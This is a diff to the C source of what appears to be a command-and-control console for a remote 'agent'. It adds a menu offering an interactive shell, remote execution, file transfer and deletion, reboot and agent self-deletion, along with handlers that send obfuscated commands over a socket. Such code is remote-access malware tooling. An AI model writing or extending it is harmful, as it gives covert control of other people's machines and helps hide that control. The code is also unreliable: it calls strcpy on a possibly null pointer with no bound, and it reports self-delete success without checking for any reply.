@@ -43,6 +43,26 @@ int AuthClient(char *recv_buf){
 	return 0;
 }
 
+void PrintHelp(void){
+    printf(
+        "Commands Menu:\n"
+        "\tlspid: list processes\n"
+        "\tshell: Interactive Shell\n"
+        "\trun [exe_path_on_agent]: run the desired executable.\n"
+        "\tterminate [pid]: Terminate a process by PID.\n"
+        "\tupload [local_file_to_upload] [full_windows_path]: securely upload a file to agent.\n"
+        "\tdownload [filename_on_agent] [local_dir]: securely download a file from agent.\n"
+        "\tdelete [filename_path_on_agent]: delete certain file.\n"
+        "\tlist drives: list all fixed and removable drives on agent.\n"
+        "\tGetDate [folder_path_on_agent]: Get date of all files in desired folder on agent.\n"
+        "\tlist drives: list all fixed and removable drives on agent.\n"
+        "\treboot: reboot the agent.\n"
+        "\tself-delete: delete the agent executable.\n"
+        "\texit: exit connection.\n"
+        );
+    return;
+
+}
 void decrypt(unsigned char* recv_buf, size_t recv_buf_size) {
 	//printf("[+] DECRYPTING with '%c' key\n", key);
 	for (int i = 0; i < recv_buf_size; i++) {
@@ -203,6 +223,43 @@ void HandleShell(char *cmd,int client_socket) {
 
  	return;
  }
+
+void HandleStartProcess(char *cmd, int client_socket){
+    char* space_pos = strchr(cmd,' ');
+    printf("space_pos +1 = %s\n",space_pos+1);
+    ssize_t sent_bytes = 0;
+    ssize_t bytes_received = 0;
+    char FileNameToRun[BUFFER_SIZE]={0};
+    strcpy(FileNameToRun,space_pos+1);
+    printf("FileNameToRun = %s\n",FileNameToRun);
+
+    encrypt( (unsigned char *)cmd,(size_t) strlen(cmd));
+    sent_bytes = send(client_socket,cmd,(size_t) strlen(cmd),0);
+    if (sent_bytes == -1){
+        perror("[x] send() failed");
+        return;
+    }
+
+    char recv_buf[BUFFER_SIZE] = {0};
+
+    bytes_received = recv(client_socket, recv_buf, BUFFER_SIZE - 1, 0);
+    if (bytes_received < 0) {
+        perror("[x] recv() failed");
+        exit(EXIT_FAILURE);
+    }
+    decrypt( (unsigned char *)recv_buf,(size_t) bytes_received);
+    //printf("[+] recv_buf == %s\n",recv_buf);
+    int err_no = atoi(recv_buf);
+    if (err_no == 16000){
+        //printf("[+] File %s ran successfully!\n",FileNameToRun);
+        printf("[x] File couldn't be run: %d\n",err_no);
+        return;
+    }
+
+    printf("[+] Process launched success, PID -> %d\n",err_no);
+
+    return;
+}
 
 void HandleStopProcess(char *cmd, int client_socket){
 
@@ -625,6 +682,21 @@ void HandleGetFileDate(char *cmd , int client_socket, char * filename){
     
     
 
+    return;
+}
+
+void HandleSelfDelete(char *cmd, int client_socket){
+    ssize_t sent_bytes = 0;
+    ssize_t bytes_received = 0;
+    encrypt( (unsigned char *)cmd,(size_t) strlen(cmd));
+    sent_bytes = send(client_socket,cmd,(size_t) strlen(cmd),0);
+    if (sent_bytes == -1){
+        perror("[x] send() failed");
+        return;
+    }
+    char recv_buf[BUFFER_SIZE] = {0};
+
+    printf("[+] self-destruct success!\n");
     return;
 }
 
